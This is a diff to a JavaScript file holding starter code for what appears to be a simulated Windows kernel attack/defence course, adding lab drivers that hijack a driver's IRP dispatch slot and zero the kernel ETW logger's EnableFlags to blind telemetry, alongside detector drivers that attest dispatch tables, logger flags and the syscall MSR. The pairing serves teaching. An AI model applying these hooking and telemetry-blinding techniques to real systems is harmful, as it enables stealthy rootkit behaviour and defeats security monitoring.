@@ -256,7 +256,7 @@ NTSTATUS DriverEntry(
 // Module 2 attack/defense workshops (m2.l3 / m2.l4). World anchors are the
 // KFWARZ_* constants exported from apps/web/src/scenarios.js:
 //   kvmdrv.sys base   0xfffff8055a700000
-//   victim KDPC       0xfffff8055a701000   ('DPCk' @+0, routine @+0x18)
+//   victim KDPC       0xfffff8055a701000   ('DPCk' @+0, routine @+8)
 //   canary page       0xfffff8055a702000   (protected range, 64 bytes)
 // ---------------------------------------------------------------------------
 
@@ -335,10 +335,6 @@ export const ATTACK_LOCKDOWN_STARTER = `// ATTACK 2 - directed-DPC CPU lockdown 
 #include <ntddk.h>
 
 #define CORES 4
-
-// deterministic world anchor: keep the full-width VA in your source so the
-// structural validator can tie your patch site to this world's canary page
-#define CANARY_PAGE 0xfffff8055a702000ULL
 
 static KDPC g_lockDpc[CORES];
 
@@ -645,6 +641,251 @@ NTSTATUS DriverEntry(
     DbgPrint("INJ: attach-based write -> ok\\n");
 
     DbgPrint("INJ: secret=kf-ul-inject-ok\\n");
+    return STATUS_SUCCESS;
+}
+`;
+
+// ---------------------------------------------------------------------------
+// m24.l1.lab2 — author-your-own IRP MajorFunction hook
+export const ATTACK_IRP_STARTER = `// ATTACK 5 - IRP MajorFunction hijack (m24.l1)
+//
+// No PatchGuard watches DRIVER_OBJECTs: legitimate drivers rewrite their
+// MajorFunction slots on every DriverEntry, so one more qword write is
+// invisible to the verifier. kfser.sys's DEVICE_CONTROL slot already
+// carries kfsnoop's rewrite - take it over yourself: point the slot at
+// the seeded trampoline and every IOCTL through the stack completes YOUR
+// status instead.
+//
+// After loading, prove it from the debugger:
+//   kd> !ioctltest kfser          ; completion flips to your magic status
+//   kd> !dispatchscan             ; the EDR view: FOREIGN -> your page
+
+#include <ntddk.h>
+
+#define VICTIM_SLOT 0xfffff8055a7100e0ULL   // &kfser!MajorFunction[IRP_MJ_DEVICE_CONTROL]
+#define TRAMPOLINE  0xfffff8055a730000ULL   // seeded stub: completes 0xDEAD0003
+
+NTSTATUS DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath)
+{
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    PVOID* slot = (PVOID*)VICTIM_SLOT;
+    DbgPrint("ATTACK-IRP: victim slot held %p\\n", *slot);
+    *slot = (PVOID)TRAMPOLINE;
+    DbgPrint("ATTACK-IRP: MajorFunction[IRP_MJ_DEVICE_CONTROL] now -> %p\\n",
+             (PVOID)TRAMPOLINE);
+    return STATUS_SUCCESS;
+}
+`;
+
+// ---------------------------------------------------------------------------
+// m24.l2.lab1 — KF-Sentinel v5: dispatch-table + object-type attestation
+export const SENTINEL_V5_STARTER = `// KF-Sentinel v5 - dispatch table & object-type attestation (m24.l2)
+//
+// The m24 world: kfsnoop.sys rewrote kfser.sys's MajorFunction
+// [IRP_MJ_DEVICE_CONTROL] and registered a Process.OpenProcedure. Neither
+// structure is PatchGuard-protected, so detection is YOUR job.
+//
+// Production sensors baseline every table at load and convict drift; this
+// teaching build convicts ATTRIBUTION-style: any wired MJ handler that
+// resolves into a module which has no business owning kfser's dispatch
+// (here: the kfsnoop.sys range), plus any initializer procedure that grew
+// a pointer where NULL was recorded.
+
+#include <ntddk.h>
+
+#define KFSER_BASE      0xfffff8055a710000ULL
+#define KFSER_SIZE      0x4000
+#define MJ_TABLE_OFF    0x70      // _DRIVER_OBJECT.MajorFunction (teaching layout)
+#define MJ_COUNT        28
+
+#define KFSNOOP_BASE    0xfffff8055a720000ULL
+#define KFSNOOP_SIZE    0x4000
+
+#define OT_PROCESS      0xfffff8055a728000ULL
+#define OPENPROC_OFF    0x40      // OBJECT_TYPE_INITIALIZER.OpenProcedure
+
+static int inRange(unsigned long long va,
+                   unsigned long long base, unsigned long long size)
+{
+    return va >= base && va < base + size;
+}
+
+NTSTATUS DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath)
+{
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    int convictions = 0;
+
+    // ---- surface 1: kfser's MajorFunction table --------------------------
+    unsigned long long* mj =
+        (unsigned long long*)(KFSER_BASE + MJ_TABLE_OFF);
+    DbgPrint("SENTINEL-V5: attesting DRIVER_OBJECT kfser @ %p\\n",
+             (PVOID)KFSER_BASE);
+    for (int i = 0; i < MJ_COUNT; i++) {
+        unsigned long long h = mj[i];
+        if (h == 0) continue;                       // unwired default
+        if (!inRange(h, KFSNOOP_BASE, KFSNOOP_SIZE)) continue;
+        convictions++;
+        if (i == 14) {
+            DbgPrint("SENTINEL-V5: FOREIGN DISPATCH IRP_MJ_DEVICE_CONTROL"
+                     " -> %p\\n", (PVOID)h);
+        } else {
+            DbgPrint("SENTINEL-V5: FOREIGN DISPATCH mj[%d] -> %p\\n", i,
+                     (PVOID)h);
+        }
+    }
+
+    // ---- surface 2: Process type initializer ------------------------------
+    unsigned long long openProc =
+        *(unsigned long long*)(OT_PROCESS + OPENPROC_OFF);
+    if (openProc != 0) {
+        convictions++;
+        DbgPrint("SENTINEL-V5: Process.OpenProcedure HOOKED -> %p\\n",
+                 (PVOID)openProc);
+    } else {
+        DbgPrint("SENTINEL-V5: Process.OpenProcedure clean (NULL baseline)\\n");
+    }
+
+    if (convictions > 0) {
+        DbgPrint("SENTINEL-V5: %d dispatch-layer conviction(s)\\n",
+                 convictions);
+        DbgPrint("SENTINEL-V5: secret=kf-sentinel-v5-ok\\n");
+    } else {
+        DbgPrint("SENTINEL-V5: tables attested clean\\n");
+    }
+    return STATUS_SUCCESS;
+}
+`;
+
+// ---------------------------------------------------------------------------
+// m26.l2.lab1 — kernel ETW logger blindfolding
+export const ATTACK_ETWTAMPER_STARTER = `// ATTACK 6 - CKCL EnableFlags zeroing (m26.l2)
+//
+// The kernel's shared telemetry gate is a pool struct, not protected
+// state: PatchGuard never walks _WMI_LOGGER_CONTEXT. Zero the CKCL
+// session's EnableFlags dword and every event class dies at build time -
+// providers keep succeeding, nothing reaches the buffers.
+//
+// After loading, prove it from the debugger:
+//   kd> !etwpump 8                ; delivered: 0  suppressed: 8
+//   kd> !etwloggers               ; verdict: BLINDED + repair line
+
+#include <ntddk.h>
+
+#define CKCL_CONTEXT   0xfffff8055a740000ULL  // _WMI_LOGGER_CONTEXT (teaching)
+#define ENABLEFLAGS_OFF 0x10
+
+NTSTATUS DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath)
+{
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    volatile ULONG* flags =
+        (volatile ULONG*)(CKCL_CONTEXT + ENABLEFLAGS_OFF);
+    DbgPrint("ATTACK-ETW: CKCL EnableFlags was 0x%08x\\n", *flags);
+    *flags = 0;
+    DbgPrint("ATTACK-ETW: CKCL EnableFlags now 0x%08x - gate closed\\n",
+             *flags);
+    return STATUS_SUCCESS;
+}
+`;
+
+// ---------------------------------------------------------------------------
+// m26.l3.lab1 — KF-Sentinel v7: logger-context attestation
+export const SENTINEL_V7_STARTER = `// KF-Sentinel v7 - ETW logger attestation (m26.l3)
+//
+// PatchGuard ignores _WMI_LOGGER_CONTEXT; EDR agents poll-and-assert their
+// own sessions instead. Baseline here: CKCL EnableFlags == 0xff. Any drift
+// (zero especially) means someone is starving the trace buffers.
+
+#include <ntddk.h>
+
+#define CKCL_CONTEXT    0xfffff8055a740000ULL
+#define ENABLEFLAGS_OFF 0x10
+#define BASELINE_FLAGS  0x000000ff
+
+NTSTATUS DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath)
+{
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    volatile ULONG* flags =
+        (volatile ULONG*)(CKCL_CONTEXT + ENABLEFLAGS_OFF);
+    ULONG cur = *flags;
+
+    DbgPrint("SENTINEL-V7: attesting logger CKCL @ %p\\n",
+             (PVOID)CKCL_CONTEXT);
+    if (cur != BASELINE_FLAGS) {
+        DbgPrint("SENTINEL-V7: EnableFlags DRIFT 0x%08x -> 0x%08x (%s)\\n",
+                 BASELINE_FLAGS, cur,
+                 cur == 0 ? "BLINDED" : "TAMPERED");
+        // re-assert the baseline: agents repair, they do not just alert
+        *flags = BASELINE_FLAGS;
+        DbgPrint("SENTINEL-V7: baseline re-asserted -> 0x%08x\\n", *flags);
+        DbgPrint("SENTINEL-V7: secret=kf-sentinel-v7-ok\\n");
+    } else {
+        DbgPrint("SENTINEL-V7: logger context matches baseline\\n");
+    }
+    return STATUS_SUCCESS;
+}
+`;
+
+// ---------------------------------------------------------------------------
+// m25.l2.lab1 — KF-Sentinel v6: rdmsr attestation of the syscall entry
+export const SENTINEL_V6_STARTER = `// KF-Sentinel v6 - MSR attestation engine (m25.l2)
+//
+// IA32_LSTAR decides where EVERY syscall lands. A healthy value points
+// into ntoskrnl's image; anything else is a redirect. PatchGuard catches
+// drift on its clock - this sensor convicts on YOURS, from inside the
+// kernel, via the modeled __readmsr shim.
+
+#include <ntddk.h>
+
+#define IA32_LSTAR       0xC0000082ULL
+#define BASELINE_LSTAR   0xfffff80100001380ULL  // KiSystemCallHandler thunk
+#define KFARCH_BASE      0xfffff8055a760000ULL
+#define KFARCH_SIZE      0x4000ULL
+
+/* Wraparound delta: (va - base) is tiny iff va sits in [base, base+size).
+ * Unsigned arithmetic, no magnitude compares on canonical addresses. */
+static int inRange(unsigned long long va,
+                   unsigned long long base, unsigned long long size)
+{
+    return (va - base) < size;
+}
+
+NTSTATUS DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath)
+{
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    unsigned long long lstar = __readmsr(IA32_LSTAR);
+    DbgPrint("SENTINEL-V6: IA32_LSTAR = %p\\n", (PVOID)lstar);
+
+    if (lstar == BASELINE_LSTAR) {
+        DbgPrint("SENTINEL-V6: syscall entry matches boot baseline\\n");
+        return STATUS_SUCCESS;
+    }
+
+    DbgPrint("SENTINEL-V6: LSTAR REDIRECTED -> foreign handler %p\\n",
+             (PVOID)lstar);
+    if (inRange(lstar, KFARCH_BASE, KFARCH_SIZE)) {
+        DbgPrint("SENTINEL-V6: attributed to kfarch.sys+0x800\\n");
+    }
+    DbgPrint("SENTINEL-V6: secret=kf-sentinel-v6-ok\\n");
     return STATUS_SUCCESS;
 }
 `;
